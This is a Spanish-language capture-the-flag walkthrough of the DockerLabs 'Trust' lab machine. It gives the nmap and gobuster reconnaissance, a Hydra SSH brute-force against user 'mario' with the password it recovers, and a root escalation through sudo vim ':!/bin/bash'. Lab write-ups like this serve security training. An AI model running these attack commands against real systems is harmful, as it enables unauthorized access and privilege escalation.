# 🖥️ Máquina Trust  
- 🔓 Dificultad: **muy fácil**

## 🔌 Comprobamos la conexión:
Primero comprobaremos si tenemos conexión con la máquina Injection:

```bash
ping -c 2 172.18.0.2
```

📡 Este comando enviará solo 2 paquetes ping a la dirección IP designada y luego terminará.

```
PING 172.18.0.2 (172.18.0.2) 56(84) bytes of data.
64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.070 ms
64 bytes from 172.18.0.2: icmp_seq=2 ttl=64 time=0.130 ms 

--- 172.18.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1039ms
rtt min/avg/max/mdev = 0.070/0.100/0.130/0.030 ms
```

---

## 🔍 Escaneo con Nmap
Ahora haremos un escaneo de puertos con la herramienta 🛠️ **Nmap**:

```bash
sudo nmap -p- -sS -sC --open -sV --min-rate=5000 -n -vvv -Pn 172.18.0.2 -oN /home/kali/Escritorio/dockerlabs_maquinas/maquinas_muy_faciles/maquina_trust_muyfacil/escaneo_trust.txt            
```

🧾 **Explicación de los parámetros del comando:**

- `-p-` Escanea **todos los 65535 puertos TCP**
- `-sS`  Escaneo **SYN sigiloso** 
- `-sC` Usa **scripts por defecto** 
- `--open` Muestra **solo puertos abiertos** 
- `-sV` Detecta la **versión de los servicios** 
- `--min-rate=5000` Velocidad mínima de **5000 paquetes/s** 
- `-n` Sin resolución DNS 
- `-vvv` Modo muy detallado 
- `-Pn` Sin ping al host antes de escanear 
- `-oN` Guarda el resultado en la ruta especificada 

---

## 📊 Resultado del escaneo

![captura-login](https://raw.githubusercontent.com/m4zpan1/DockerLabs_Resolutions/refs/heads/main/RECURSOS/trust%201.png)

🔍 Observamos que los puertos **22 (SSH)** y **80 (HTTP)** están abiertos.


🌐 Al ingresar la dirección IP `172.18.0.2` nos muestra la página por defecto de **Apache**.

![captura-login](https://raw.githubusercontent.com/m4zpan1/DockerLabs_Resolutions/refs/heads/main/RECURSOS/trust%202.png)

---

## 🚀 Ataque de Fuzzing con GoBuster

Lanzamos un ataque de fuzzing con la herramienta 🧰 **GoBuster**:

```bash
gobuster dir -u http://172.18.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,sh,py
```

📘 **Explicación del comando:**

- `dir` → Modo de búsqueda de **directorios y archivos**  
- `-u http://172.18.0.2/` → URL del servidor web   
- `-w ...` → Diccionario de palabras   
- `-x html,php,sh,py` → Extensiones a probar 

![captura-login](https://raw.githubusercontent.com/m4zpan1/DockerLabs_Resolutions/refs/heads/main/RECURSOS/trust%203.png)

Descubrimos el archivo `/secret.php`, el cual revela información útil:

![captura-login](https://raw.githubusercontent.com/m4zpan1/DockerLabs_Resolutions/refs/heads/main/RECURSOS/trust%204.png)

---

## 🧑‍💻 Fuerza Bruta con Hydra

Con el posible usuario `mario`, lanzamos un ataque de fuerza bruta con **Hydra** 🐍:

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2 -t 50
```

![captura-login](https://raw.githubusercontent.com/m4zpan1/DockerLabs_Resolutions/refs/heads/main/RECURSOS/trust%205%20.png)

🔐 Ahora tenemos las credenciales:

- 👤 **Usuario**: `mario`  
- 🔑 **Contraseña**: `chocolate`

Nos conectamos por SSH:

```bash
ssh mario@172.18.0.2
```

---

## ⬆️ Escalada de Privilegios

📜 Verificamos permisos sudo:

```bash
sudo -l
```

```bash
User mario may run the following commands on 59cb77302414:
    (ALL) /usr/bin/vim
```

⚡ Podemos usar `vim` para obtener una shell como root:

```bash
sudo vim -c ':!/bin/bash'
```

📟 Verificación:

```bash
root@59cb77302414:/home/mario# whoami
root
```

